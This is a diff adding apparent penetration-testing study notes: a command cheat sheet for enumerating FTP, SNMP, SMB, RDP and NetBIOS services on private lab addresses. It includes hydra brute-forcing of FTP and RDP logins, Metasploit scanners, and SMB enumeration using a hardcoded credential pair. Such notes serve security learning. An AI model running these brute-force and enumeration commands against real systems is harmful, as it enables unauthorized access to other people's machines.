@@ -1,0 +1,72 @@
+ftp enum:
+
+nmap -sC -p21 192.168.149.128    [for enumerating which ftp port is open]
+nmap -sC -p21 192.168.149.*     [for enumerating which ftp port is open]
+hydra -L /usr/share/wordlists/metasploit/common_roots.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt  192.168.149.129 ftp    [bruteforcing ftp, smtp and many more]
+ftp 192.168.149.129    [for creating ftp connection]
+Now put username password
+get secret.txt    [for downloading anything from remote server]
+download secret.txt    [for downloading anything from remote server]
+
+snmp enum:
+
+tools used:
+nmap
+snmp-check
+metasploit
+
+nmap -sU 192.168.149.128    [udp ports scan]
+snmp-check 192.168.149.128    [enumerating snmp]
+https://nmap.org/nsedoc/scripts/snmp-processes.html
+nmap -sU -p 161 --script=snmp-processes 192.168.149.128    [finding running processes using nmap]
+finding valid string using metasploit:
+search snmp
+use auxiliary/scanner/snmp/snmp_login
+show options
+set RHOSTS 192.168.149.128
+run
+nmap -sU -p 161 --script=snmp-interfaces 192.168.149.128
+
+SMB enumeration:
+
+nmap 192.168.149.128 
+enumerating shares:
+nmap -p 445 --script smb-enum-shares 192.168.149.128 
+Connect smb gui method:
+smb://192.168.149.128
+enumerating users:
+nmap -p 445 --script smb-enum-users 192.168.149.128 
+nmap -p 445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771  192.168.149.128 
+enumerating workgroups:
+nmap -p 445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771  192.168.149.128
+enumerating security level:
+nmap -sC -sV -A -T4 -p445 192.168.149.128 
+enumerating services:
+nmap -p 445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771  192.168.149.128
+nmap -p 445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771  192.168.149.128
+
+Exploiting RDP
+
+
+check if rdp is open:
+nmap 192.168.149.128
+confirming rdp:
+msfconsole
+search rdp
+use auxiliary/scanner/rdp/rdp_scanner
+set RHOSTS 192.168.149.128
+set RPORT 3333
+run
+bruteforcing login credentials:
+hydra -L /usr/share/wordlists/metasploit/common_roots.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt  rdp://192.168.149.129  -s 3333
+ 
+use Xfreerdp to create rdp session:
+xfreerdp /u:administrator /p:password /v:192.168.149.128:3333
+
+Netbios enumeration:
+
+
+ 
+nmap -sP 192.168.149.*
+nmap -sV  --script nbstat.nse 192.168.149.128 
+Just find the workgroups
